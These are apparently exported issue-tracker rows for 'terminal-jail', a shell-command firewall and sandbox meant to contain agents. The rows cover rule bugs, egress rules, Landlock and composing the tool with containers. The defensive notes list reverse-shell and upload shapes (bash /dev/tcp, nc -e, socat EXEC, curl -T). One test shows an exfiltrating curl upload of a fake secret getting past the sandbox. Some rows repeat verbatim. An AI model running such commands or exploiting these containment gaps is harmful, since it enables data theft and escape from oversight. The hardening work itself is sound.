detail: bubblewrap is LGPL-2.1-or-later; terminal-jail is MIT. Invoking an installed bwrap BINARY across a process boundary is NOT linking and creates no derivative-work obligation — but shipping/bundling/fetching the binary (vendoring, static link, 'install.sh downloads bwrap') WOULD create redistribution duties the MIT repo must not silently take on. Scope: (a) install.sh detects bwrap via command -v; when absent in release mode it PRINTS the distro package command (apt install bubblewrap / dnf install bubblewrap) and continues with the unshare backend — it must NEVER download or embed the binary; (b) README + specs document the optional dependency with its license and the no-vendoring rule; (c) a NOTICE/THIRD_PARTY note listing bubblewrap (LGPL-2.1+) as an optional runtime dependency, mirroring how the repo already treats PyYAML/util-linux; (d) CI check: no bwrap binary/artifact may enter the repo tree or the release assets (grep + size guard); (e) TERMINAL_JAIL_BWRAP path override so operators can point at their own build. PASS: fresh-container run of install.sh with bwrap absent exits 0, prints the package hint, installs nothing LGPL; grep -r 'bwrap' release assets/CI artifacts = binaries none; README documents the dependency + license.

detail: 2026-09-16 research identified the biggest uncovered class: nothing in the engine touches network egress. An agent can call home or ship data out. Vectors to cover (block the unambiguous, sandbox the dual-use): (1) reverse shells — bash /dev/tcp/HOST/PORT redirects, `bash -i >& /dev/tcp/...` classic, nc/ncat -e or -c shell attach, socat EXEC:'sh', pty,reverse; mkfifo + telnet/nc two-way plumbing; openssl s_client -connect piped to sh (unambiguous exfil/shell shapes only, not TLS diagnostics); (2) upload exfil — curl -T/--upload-file, --data-binary @large-path, wget --post-file, scp/rsync of suspicious whole-tree scope (rsync -a / to remote target); (3) staged pipes — curl host/script | sh is ALREADY covered (builtin-fetch-pipe); extend to wget -O- | sh, python -c urllib urlopen|exec shapes. DUAL-USE must NOT hard-block: plain `ssh host`, `scp file host:` are fleet-legit (deploys run on ssh) — give them action=modify (auto-sandbox) or leave allow + document; plain `curl url`, `wget url` stay ALLOW (downloads are normal); git push stays ALLOW. detail: Bane 2026-09-17: 'a way to enable extra rules that are not part of the main set'. Design: ship curated packs as rules/packs/<name>.yaml in-repo (our own content, MIT, no licensing exposure); install.sh gains --rule-pack <name> (repeatable) and --list-rule-packs; the standalone wrapper + bridge already merge user rules from ~/.config/terminal-jail/rules.d/*.yaml, so a pack install = writing rules.d/terminal-jail-pack-<name>.yaml — no new engine merge code needed. CONTRACTS to pin: (a) precedence — engine builtins < packs < user rules.d files, and a pack rule id NEVER overrides a builtin id (the 2026-09-16 shadowing incident proved same-id user copy silently overrides engine rules; packs must use prefixed ids like pack-db-*, collision = install error, not silent override); (b) schema validation at install time (bad pack = refuse, not skip); (c) uninstall path (--unrule-pack) that removes only that pack's file; (d) each pack ships its own test file exercising its rules through intercept(); (e) README lists packs with what they block and the false-positive stance. Main set stays lean by default — packs are opt-in per host. detail: Shipped rule (plugin/terminal_jail/rules/00-builtins.yaml, allow-cat-safe, description 'Safe file reads (non-sensitive paths)'): pattern `^cat\s(?!.*/(etc|boot|proc|sys))`. The `.*` inside the lookahead can match the empty string, so ANY command whose path starts with /etc, /boot, /proc or /sys fails the lookahead and the rule does not match — proved standalone: re.match(pattern, 'cat /etc/passwd') -> False, while 'cat /tmp/x' -> True. Consequence: on sensitive paths the rule silently vanishes and `cat /etc/passwd` is allowed by DEFAULT-ALLOW (rule_id null, live-probed) rather than by any explicit decision; on benign paths it only adds a redundant allow. The description promises discrimination the regex cannot deliver.
foreman_note: PREMISE-FALSE 2026-09-18 (stand-in PM cycle, live-verified, no code change): the load-bearing claim does not hold. Bridge probes re-run by the PM: "cat /etc/passwd" -> action=allow rule_id=null (the negative lookahead DOES exclude the advertised prefixes, so the rule does not mis-attribute them) and "cat /tmp/x" -> action=allow rule_id=allow-cat-safe; specs/interruptor.md:169-172 documents the deliberate non-match plus default-allow as intended, not a bug. The row proposed anchoring the lookahead to a token boundary; diffed against the shipped pattern over 7 vectors the anchored form changes ONLY attribution, and only for paths that mention /etc later in the string ("cat /etcfoo", "cat /tmp/notes/etc/passwd", "cat  /etc/passwd", "cat /tmp/x /etc/y") - every one of those stays action=allow either way, so the proposed fix cannot change a single verdict. Residual (cosmetic, no code change): the rule description "Safe file reads (non-sensitive paths)" reads as a discrimination promise; the rule catalog work in DF-TERMINAL-JAIL-9 is the right home for that wording. Shipped pattern left byte-identical.

detail: On a non-default TERMINAL_JAIL_INSTALL_DIR the installer still writes export PATH="$HOME/.local/bin:$PATH" into the user startup file and prints "added PATH entry to <file>". install.sh:259-267 detects-and-appends that literal (the heredoc at :267 is quoted, so TERMINAL_JAIL_INSTALL_DIR cannot expand), while the terminal-only hint at :271/:275 does print the correct export. detail: Found by the TJ-GAP-058 worker and re-verified foreman-side at 9fda86a. Live `intercept("go test ./... | tee /tmp/log")` -> action=modify, modified="unshare --user --pid --fork --kill-child=SIGKILL bash -c 'go test ./...' tee /tmp/log" — the `|` is gone, so `tee /tmp/log` becomes an ARGUMENT to the sandboxed `go test` instead of a second pipeline stage. Cause: the aggregate MODIFY path joins the modified segments with a single space (" ".join(modified_segments) in decider.py) instead of re-joining with the operator that separated them. The standalone wrapper executes that string, so a modify verdict silently changes the command's semantics (and in the worst case the trailing stage never runs while its arguments are fed to the first command). Affects every pipeline that hits any sandbox rule, not just the new net rules.

detail: plugin/terminal_jail/interruptor/userns.py::unshare_prefix() selects the MAPPED prefix whenever mapped_launch_ok() is True, and that preflight is `unshare --user --map-users=65534:<subuid>:1 --map-groups=65534:<subgid>:1 -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL true` — it proves the namespace can be CREATED, never that the payload can still reach the user's files. detail: Measured with a real local collector at HEAD 5275a86: bridge verdict for `curl -s -T /tmp/dogfood-tj/secret.txt http://127.0.0.1:18777/collect` -> {"action":"modify","rule_id":"builtin-net-curl-upload"}; the CLI ran the rewritten command `unshare --user --pid --fork --kill-child=SIGKILL bash -c 'curl -s -T …/secret.txt http://127.0.0.1:18777/collect'`, exit 0, and the collector received 132 bytes containing the secret content (FAKE_PRIVATE_KEY_MATERIAL). So builtin-net-curl-upload (and the whole BUILTIN_SANDBOX egress group added by TJ-GAP-058) contains the process; it does not stop the data leaving. The commit message describes the group as covering 'sandbox exfil', and a reader of the README's rule table reasonably reads auto-sandbox as a mitigation — it is not: on the mapping-less (legacy) branch the sandboxed curl reads the caller's file fine and the upload completes; on a mapped branch the upload fails only because the payload cannot read the caller's files at all (DF-15), not because of any security decision. Net effect: an agent or user who is exfiltrating still succeeds whenever the rule is the only thing in the way.

detail: Fresh box (bunker-las-02, Debian, python3 3.13.5): the README Rule-packs flow `./install.sh --rule-pack db` printed `rule-pack-tool: refused: .../rules/packs/db.yaml: cannot parse (JSONDecodeError: Expecting value: line 1 column 1 (char 0))` then `rule pack 'db' REFUSED - nothing was written`, exit 2, and NO wrapper was installed (`~/.local/bin/terminal-jail` absent). Cause: scripts/rule-pack-tool.py parses YAML with PyYAML and falls back to json, so on a host without PyYAML a valid pack is a guaranteed JSONDecodeError; the docs say only 'installing a pack requires python3' and never name PyYAML, and a bare user cannot install it (no pip, `sudo` needs a password). Because install.sh runs `set -eu`, the refusal also ends the whole install instead of skipping the pack. Control on the SAME box without the flag: install clean, `terminal-jail --version` = 1.1.0, `chmod 777 /tmp/x` -> COMMAND BLOCKED builtin-chmod-777-root rc=126. Fix direction: (a) detect PyYAML before the pack phase and fail with a message that names the dependency and the remedy; (b) do not let a pack refusal abort the base install - install the wrapper and report the pack as skipped; (c) document the requirement (README + quickstart + specs/cli.md). Add a fresh-machine (no-PyYAML) install cell to the battery so this cannot regress.

detail: Pattern rules match the statement shape anywhere in the command string (documented as deliberate), which in a DB pack inverts the cost/benefit. Measured through the bridge with the pack live: `psql -c "DROP TABLE users"` -> block pack-db-drop-table (good); `psql -f migrations/002_legacy.sql` (the file DOES drop a table) -> allow/null (pre-existing DF-TERMINAL-JAIL-10 file-body gap); `sed -i "s/DROP DATABASE/-- DROP DATABASE/" migrations/003_shard.sql` -> block pack-db-drop-database; `git commit -am "park the DROP DATABASE migration"` -> block pack-db-drop-database; `psql -c "SELECT msg FROM t WHERE msg = 'drop database retry'"` (read-only) -> block; `echo "DROP TABLE users" > build/rollback.sql` -> allow (allow-echo). Net: the user is stopped from editing, committing or querying the phrase, and not stopped from executing it from a file. Fix direction: constrain the pack's two block rules to execution context rather than bare text (e.g. require the SQL client + a non-select statement, or exclude quoted string literals, `sed` replacement expressions and git -m messages), and pair the pack with the file-body fix so the destructive path it targets is actually covered. Regression cases: the six shapes above.

detail: With a same-id override (`action: warn`) in rules.d, the verdict the CLI prints is `terminal-jail: WARNING - would have blocked: Command blocked by security policy.` The generic placeholder replaces the rule's own block_message, so the warning does not say which policy was downgraded or what it protects - and warn mode exists precisely so an operator can decide whether the downgrade is safe. The engine does emit the right rule_id. Fix direction: carry the matched rule's block_message through the warn path instead of the generic string, and add a bridge test asserting the downgraded rule's message appears in `reason`.

description: Found 2026-09-24 dogfood (firewall-as-a-library angle) by probing the documented JSON bridge with oversized arguments. Bisect: 500B arg = 0.11s, 2KB = 0.65s, 8KB = 9.2s bridge wall (7.491s intercept() alone), 20KB = >10s timeout. cProfile: matcher.py:115 _match_pattern — 145 re.Pattern.search calls, 7.555s of 7.566s (99.8% self-time); parser is 4ms. acceptance_criteria: 1) A capability probe reports the Landlock ABI (and what it can enforce) per host, alongside the existing pidns-capability-probe.py and fs-isolation-probe.py. 2) When the host permits Landlock but denies uid mapping, the jail enforces a filesystem tier (at minimum: deny reads of the agent credential surfaces — ~/.ssh, ~/.config/terminal-jail token files, hermes secret env, other users' homes — and deny writes outside the working tree) instead of degrading silently to 'no filesystem isolation'. 3) Where Landlock cannot enforce, behaviour is unchanged and still warns loudly; the tier is reported per host in --help/README (docs row DOC-8 tracks the capability matrix). 4) Tests cover: enforcement active on a permitting host (prove a denied read returns EACCES), graceful absence on a non-permitting host, and no regression to the existing unshare/bwrap paths. 5) The per-host report is machine-readable so the fleet can record which tier each image actually gets. 6) OWNERSHIP (decided 2026-10-01 by live experiment): this tier belongs to terminal-jail, NOT bunker -- Landlock enforces on a plain host with no userns and no root (the exact deployment case this tool exists for: dev box, CI runner, agent shell without a container), and it also enforces inside this tool's own jails, so it composes. Moving it to the platform would leave every non-bunker deployment on the DEGRADED tier. When bunker hosts the agent, its container boundary is the OUTER layer and Landlock is defence in depth, not duplication.
decision: OWNERSHIP DECISION 2026-10-01 (Bane: 'are these right for terminal-jail or should they be in bunker?'; decided by live experiment, not opinion): the tool owns per-command JUDGEMENT and every guarantee it can hold on ANY host without root; the platform (bunker) owns ambient NAMESPACE/LIFECYCLE primitives. Experiment, this host (Ubuntu 26.04, kernel 7.0.0-31, apparmor_restrict_unprivileged_userns=1): (a) private /proc via unshare is UNREACHABLE here -- `unshare --user --map-root-user --mount --mount-proc` rc=1 'write failed /proc/self/uid_map: Operation not permitted', and without --map-root-user rc=1 'cannot change root filesystem propagation: Permission denied'; bwrap is the only in-tool route and is an optional system package; (b) Landlock enforces with NO user namespace and NO root: as plain uid 1000 (ABI 8) a DAC-readable file became 'DENIED (Permission denied)' after restrict_self, and /etc/hostname was denied too; (c) Landlock also enforces INSIDE both of this tool's jails (uid 65534, identical results) -- it composes with the wrapper instead of fighting it. LAYERS, NOT EITHER/OR (Bane 2026-10-01): each is a standalone building block -- sometimes only terminal-jail is wanted, sometimes only bunker -- and the strongest configuration is the pair, tool inside the platform. The composed stack is not automatic today: measured, the tool REFUSES to run inside a container (`namespace creation failed (unshare exit 1)`) while the container already provides a private /proc and its own PID ns. See the composed-mode row filed from the same experiment.
description: Measured 2026-09-27 on Ubuntu 26.04 / kernel 7.0.0-31: the jail's filesystem half is ABSENT by default. `terminal-jail --user sh -c ...` prints 'no filesystem isolation — could not create a uid mapping under the user namespace (this host denies setuid inside unprivileged user namespaces, e.g. Ubuntu AppArmor profile 'unprivileged_userns')' and scripts/fs-isolation-probe.py classifies the host DEGRADED (mapped launch rc=1, 'setgroups failed: Operation not permitted'). Only the PID/identity layers hold, so a jailed process still reads the caller's files. This is the same wall Anthropic's sandbox-runtime documents for Ubuntu 24.04+ (kernel.apparmor_restrict_unprivileged_userns strips capabilities from the namespace), so it is an ecosystem fact — but it is the largest single reduction of the project's containment promise on the distro most users install. Landlock needs no uid mapping and no capability-bearing user namespace: landlock_create_ruleset(VERSION) returns ABI 8 on this kernel, and ABI >= 1 already gives filesystem access control. Precedent: OpenAI's Codex CLI uses Landlock for its Linux sandbox. This also subsumes the report's 'srt-style allow/deny path policy' suggestion — a Landlock ruleset IS a kernel-enforced path policy, which is strictly stronger than enumerating secret-read paths in regexes.

acceptance_criteria: 1) With the egress tier enabled, a payload that opens a TCP connection to a non-allowlisted host/port is denied by the KERNEL even when no regex matches it — demonstrated with a case that defeats the current patterns (e.g. a raw python socket or a protocol tunnel). 2) An allowlist exists for legitimate traffic (git push over ssh/https, package registries) and is documented; the deny is fail-closed, the allow is explicit. 3) Verdict/reason for a Landlock denial is distinguishable from a rule-engine denial, so an operator can tell 'a rule said no' from 'the kernel said no'. 4) Degrades honestly on hosts without Landlock ABI >= 4: no silent no-op — either the tier reports unavailable or the request to enable it fails closed. 5) The existing regex class keeps its tests; the new tier's tests prove kernel enforcement, not pattern matching.
description: TJ-GAP-058 closed the network-egress rule CLASS with regexes (/dev/tcp, nc -e, socat EXEC, curl -T, wget --post-file) and it is complete; the review's 22-payload matrix confirms three of those block with quotable rule ids. But regex matching has to out-guess every client, and the review's own honest-gaps list still names 'network egress class' as the largest hole. Landlock ABI >= 4 adds per-port TCP bind/connect control enforced by the kernel, which turns the allowlist from a pattern problem into a policy problem: deny connect except an enumerated port set, regardless of which binary or encoding is used. ABI 8 is available on this kernel. This complements, never replaces, the regex class (regex catches intent and gives a human-readable reason; Landlock catches the syscall).

acceptance_criteria: 1) The verdict (and/or a documented debug surface) states which rule file/source decided, its priority, and whether it overrode a builtin of the same id. 2) A same-id override that lowers a builtin (e.g. block -> warn) is reported at decision time, not silently applied: the reason string names the overriding file. 3) A CLI surface replays a decision in one line for a given command (the bridge can already do this — surface it as a verb/flag so an operator does not have to pipe JSON by hand; cf. description: The engine returns a quotable rule_id and reason — the strongest property of this firewall — but not the identity of the layer that won: engine builtin vs shipped YAML mirror vs user rule dir vs rule pack. That gap already cost this project a wave: TJ-GAP-051 (complete) records a shipped YAML mirror being loaded as USER rules and weakening 12 engine verdicts, and the same shadowing class was re-hit during the TJ-GAP-053 wave with a stale installed copy at ~/.config/terminal-jail/rules.d/00-builtins.yaml. Today the user-visible remedy is a documented same-id override that can LOWER a rule to warn — a legitimate feature — with nothing in the verdict or any log recording that a builtin was downgraded, so an operator cannot see the downgrade without reading the rules tree by hand. The review's observability lens flagged this as the one tamper-adjacent gap in an otherwise attributable design.

description: Verified twice on 2026-09-27: `HOME=<scratch> /path/to/repo/install.sh` run from another directory exits non-zero with 'no local checkout detected ... Supported install: run ./install.sh from a repository checkout' even though the script is sitting inside the checkout — the installer resolves ../ from $PWD instead of BASH_SOURCE, so the natural invocation (absolute path, from anywhere) silently installs nothing. Second half, same theme: the installer never checks or reports what the host can actually enforce. The project's own scripts/fs-isolation-probe.py prints an excellent, actionable remediation for the DEGRADED case ('install newuidmap/newgidmap plus /etc/subuid|/etc/subgid ranges for the calling user', or the root sysctl), but nothing runs it at install time — so an operator finishes a successful install believing they have filesystem containment when on Ubuntu they do not.

description: Measured 2026-09-27 on Ubuntu 26.04 / kernel 7.0.0-31: the suite reports 'SKIPPED [1] test_env_scrub.py:440 HOST-DEGRADED-PIDNS: host refused bare PID namespace creation', but scripts/pidns-capability-probe.py on the same host prints FULL (exit 0) and the live CLI creates a PID namespace on demand (bare mode: jail PID-ns inode 4026536818 vs host 4026531836, 5 visible PIDs vs 1129). So either the marker overstates a narrower precondition, or the classifier and the test disagree about what DEGRADED means. Both are bad in the same way: an honest-skip system that mislabels why it skipped is indistinguishable, in the output, from a real DEGRADED host — and this project's credibility rests on those skip names being true.

description: The README is unusually honest about individual limitations (private /proc is bubblewrap-only; the filesystem tier needs a uid mapping; the unshare path exposes host /proc) — the strongest trust signal in the project, and the review says so. But those limits are spread across prose, COMPATIBILITY.md and docs/backend-parity.md, so a reader cannot answer the one question that decides adoption: 'on MY host, with MY kernel and distro, which of the three layers actually enforce?' The measured 2026-09-27 answer for Ubuntu 26.04 / kernel 7.0.0-31 — PID namespace YES, identity scrub YES, seccomp YES (with --seccomp), private /proc only under bwrap, filesystem isolation NO (DEGRADED) — is exactly the kind of table the project should print, next to the two probes that generate it.

decision: OWNERSHIP DECISION 2026-10-01 (Bane: 'are these right for terminal-jail or should they be in bunker?'; decided by live experiment, not opinion): the tool owns per-command JUDGEMENT and every guarantee it can hold on ANY host without root; the platform (bunker) owns ambient NAMESPACE/LIFECYCLE primitives. Experiment, this host (Ubuntu 26.04, kernel 7.0.0-31, apparmor_restrict_unprivileged_userns=1): (a) private /proc via unshare is UNREACHABLE here -- `unshare --user --map-root-user --mount --mount-proc` rc=1 'write failed /proc/self/uid_map: Operation not permitted', and without --map-root-user rc=1 'cannot change root filesystem propagation: Permission denied'; bwrap is the only in-tool route and is an optional system package; (b) Landlock enforces with NO user namespace and NO root: as plain uid 1000 (ABI 8) a DAC-readable file became 'DENIED (Permission denied)' after restrict_self, and /etc/hostname was denied too; (c) Landlock also enforces INSIDE both of this tool's jails (uid 65534, identical results) -- it composes with the wrapper instead of fighting it. LAYERS, NOT EITHER/OR (Bane 2026-10-01): each is a standalone building block -- sometimes only terminal-jail is wanted, sometimes only bunker -- and the strongest configuration is the pair, tool inside the platform. The composed stack is not automatic today: measured, the tool REFUSES to run inside a container (`namespace creation failed (unshare exit 1)`) while the container already provides a private /proc and its own PID ns. See the composed-mode row filed from the same experiment.

Experiment, this host (Ubuntu 26.04, kernel 7.0.0-31, apparmor_restrict_unprivileged_userns=1): (a) private /proc via unshare is UNREACHABLE here -- `unshare --user --map-root-user --mount --mount-proc` rc=1 'write failed /proc/self/uid_map: Operation not permitted', and without --map-root-user rc=1 'cannot change root filesystem propagation: Permission denied'; bwrap is the only in-tool route and is an optional system package; (b) Landlock enforces with NO user namespace and NO root: as plain uid 1000 (ABI 8) a DAC-readable file became 'DENIED (Permission denied)' after restrict_self, and /etc/hostname was denied too; (c) Landlock also enforces INSIDE both of this tool's jails (uid 65534, identical results) -- it composes with the wrapper instead of fighting it. LAYERS, NOT EITHER/OR (Bane 2026-10-01): each is a standalone building block -- sometimes only terminal-jail is wanted, sometimes only bunker -- and the strongest configuration is the pair, tool inside the platform. The composed stack is not automatic today: measured, the tool REFUSES to run inside a container (`namespace creation failed (unshare exit 1)`) while the container already provides a private /proc and its own PID ns. See the composed-mode row filed from the same experiment.
description: Premise measured live at HEAD 2026-10-01 (this row exists because the review's earlier 'bare mode' probe was actually the AUTO backend, which picks bwrap on this host -- an auto-backend run is NOT evidence about the unshare path). Forced-backend results, same host, same session: (a) TERMINAL_JAIL_JAIL_BACKEND=unshare (bare) FAILS CLOSED -- 'namespace creation failed (unshare exit 1); command not run -- on unprivileged hosts try --user', because bare mode adds --mount-proc, which needs CAP_SYS_ADMIN inside the namespace; (b) TERMINAL_JAIL_JAIL_BACKEND=unshare --user SUCCEEDS but exposes the host: 1084 numeric /proc entries against 1079 on the host, /proc/1 comm = systemd, /proc/1/cmdline readable, /proc/1/root present; the wrapper deliberately omits --mount-proc under --user (see standalone/terminal-jail: 'it requires CAP_SYS_ADMIN and is incompatible with unprivileged user namespaces'), and Ubuntu's AppArmor userns restriction strips exactly those capabilities; (c) bwrap: 5 entries, /proc/1 = bwrap, private procfs -- the documented property, confirmed. Consequences of the leak: a jailed process can enumerate other processes, read same-uid cmdlines/environ, and see host /proc/net. The documented KNOWN-LIMIT is accurate but only prose -- nothing stops a deployment that assumes containment from silently getting the host view. Bane's steer: if the per-command interface is the wrong place for this primitive, it can be provided by the bunker/platform layer instead (a per-agent rootless container already has its own PID namespace and private procfs).

acceptance_criteria: 1) A composed mode exists and is documented: when the tool detects it is already running inside a containment layer that provides the namespace properties (evidence: existing PID-ns inode differing from the init ns, or an explicit env/marker from the platform), it runs the command with the FIREWALL plus whatever inner layers are still available (seccomp, identity scrub, Landlock) instead of refusing outright. 2) It never over-claims: the verdict/report states per layer what is actually enforced (firewall by the tool, namespace/PID/proc by the platform) so a reader cannot mistake the outer layer's guarantee for the tool's. 3) The failure is diagnosable in one line: when namespace creation is unavailable, the message names the cause (missing CAP_SYS_ADMIN / container seccomp profile) and the options (run with the inner userns permitted, or use composed mode). The capability probes must fail fast rather than timing out. 4) The platform side is specified and cross-linked: what a bunker agent container must permit for the inner layer to add value (bunker GAP-179), and what the agent's environment must expose for detection. 5) A composition test joins the battery with three cells: tool alone (host), platform alone (container), BOTH (tool inside container) -- each recording the measured per-layer properties (PID-ns inode, /proc entry count, /proc/1 identity, seccomp state, verdict provenance). 6) No regression to the existing fail-closed behaviour on a plain host: refusing to run when containment is demanded-but-unavailable stays the default.

description: MEASURED 2026-10-01 (Bane's doctrine: terminal-jail should work INSIDE a bunker for more security; each is a building block and the power is the composition). Experiment: ran this tool inside a container, the closest local stand-in for a bunker agent (`docker run --rm python:3.11-slim`). OUTER (platform/container): uid=0, /proc entries=4, /proc/1=bash, own PID namespace -- i.e. the platform already provides exactly the private /proc and PID-ns containment this tool cannot deliver per command on an AppArmor host. INNER (terminal-jail, installed into the container): the FIREWALL works perfectly -- 'rm -rf /' blocked with the block box, rule_id builtin-rm-rf-root, exit 126 -- but the JAIL refuses to run ANYTHING: even a benign `echo inner-layer-ok` exits with 'namespace creation failed (unshare exit 1); command not run -- on unprivileged hosts try --user', and `--user` fails the same way. Cause: the container grants no CAP_SYS_ADMIN (CapEff 00000000a80425fb excludes bit 21) and its seccomp profile blocks the inner user namespace, so the wrapper cannot create a namespace and -- correctly, per its fail-closed contract -- runs nothing. Net effect: the composed stack, which is the strongest deployment this project has, does not work out of the box. The host-capability probes also timed out (15s) inside the container instead of answering quickly, which makes the failure harder to diagnose than it needs to be.
detail: Evidence: docker run --rm python:3.11-slim, terminal-jail installed into a scratch HOME inside the container; outer layer /proc entries=4 with /proc/1=bash; inner 'rm -rf /' -> rc=126 rule_id builtin-rm-rf-root; inner `echo` -> rc!=0 'namespace creation failed (unshare exit 1)'; CapEff 00000000a80425fb (no CAP_SYS_ADMIN); probes timed out at 15s.
